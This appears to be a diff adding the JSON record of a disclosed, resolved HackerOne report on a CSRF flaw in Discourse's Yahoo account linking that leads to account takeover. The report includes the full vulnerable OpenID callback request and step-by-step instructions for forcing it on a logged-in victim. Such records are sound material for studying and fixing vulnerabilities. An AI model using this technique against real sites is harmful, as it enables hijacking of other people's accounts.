@@ -1,0 +1,122 @@
+{
+  "id": 423022,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MjMwMjI=",
+  "url": "https://hackerone.com/reports/423022",
+  "title": "Account takeover at https://try.discourse.org due to no CSRF protection in connecting Yahoo account",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-10-12T16:57:57.640Z",
+  "submitted_at": "2018-10-12T16:57:57.640Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "avinash_",
+    "url": "/avinash_",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/syqd9yja5msibw8ay0bgv7xvyupx/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-12-06T02:35:56.686Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-11-06T02:35:42.023Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi\n\nThere is an option in https://try.discourse.org/u/testh1ay/preferences/account to connect our Yahoo account.\n\nI noticed Connect Yahoo account option have the workflow with GET method and  there is lack of csrf protection on connecting yahoo account which can help attacker into inducing victim to connect attacker's yahoo account to victim's discourse account, and it leads to full account takeover of victim's account.\n\nVulnerable Request:\n\nGET /auth/yahoo/callback?_method=post&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.mode=id_res&openid.return_to=https%3A%2F%2Ftry.discourse.org%2Fauth%2Fyahoo%2Fcallback%3F_method%3Dpost&openid.claimed_id=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.identity=https%3A%2F%2Fme.yahoo.com%2Fa%2F7qAAT.abcd&openid.realm=https%3A%2F%2Ftry.discourse.org&openid.ns.ax=http%3A%2F%2Fopenid.net%2Fsrv%2Fax%2F1.0&openid.ax.mode=fetch_response&openid.ax.value.email=testhackeroneay%40yahoo.com&openid.ax.value.fullname=test%20hackerone&openid.ax.value.nickname=test&openid.assoc_handle=abcd&openid.response_nonce=2018-10-12T16%3A27%defg-&openid.signed=assoc_handle%2Cclaimed_id%2Cidentity%2Cmode%2Cns%2Cop_endpoint%2Cresponse_nonce%2Creturn_to%2Csigned%2Cax.value.email%2Cax.type.email%2Cax.value.fullname%2Cax.type.fullname%2Cax.value.nickname%2Cax.type.nickname%2Cns.ax%2Cax.mode%2Cpape.auth_level.nist&openid.op_endpoint=https%3A%2F%2Fopen.login.yahooapis.com%2Fopenid%2Fop%2Fauth&openid.ax.type.email=http%3A%2F%2Faxschema.org%2Fcontact%2Femail&openid.ax.type.fullname=http%3A%2F%2Faxschema.org%2FnamePerson&openid.ax.type.nickname=http%3A%2F%2Faxschema.org%2FnamePerson%2Ffriendly&openid.pape.auth_level.nist=0&openid.sig=9p%2Bxyz HTTP/1.1\nHost: try.discourse.org\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\n\nSteps to reproduce:\n\n1. Attacker go to https://try.discourse.org/u/user/preferences/account\n2. Switch on burp interceptor and click on Yahoo connect.\n3. Go to burp interceptor and after forwarding some requests attacker will find the upper mentioned vulnerable request.\n4. Copy that and drop the request( here you saved the auth token generated by yahoo).\n5. Now feed the copied request to authenticated victim (as a html form or as an url).\n6. Victim get the message authentication complete and get redirected to https://try.discourse.org/?authComplete=true.\n7. Attacker open his browser and try to login with yahoo.\n8. Attacker get redirected to https://try.discourse.org/auth/yahoo/null\n9. Attacker open https://try.discourse.org\n10. Check Victim's account successfully compromised.\n\n## Impact\n\nAccount Takeover.",
+  "bounty_amount": "512.0",
+  "formatted_bounty": "$512",
+  "weakness": {
+    "id": 45,
+    "name": "Cross-Site Request Forgery (CSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-12-06T02:35:42.078Z",
+  "allow_singular_disclosure_after": -234276451.1638409,
+  "singular_disclosure_allowed": true,
+  "vote_count": 87,
+  "voters": [
+    "muon4",
+    "ali",
+    "sameerphad72",
+    "andi",
+    "spam404",
+    "dhakal_ananda",
+    "aryan2808",
+    "mik317",
+    "flashdisk",
+    "savitar0x01",
+    "and 77 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
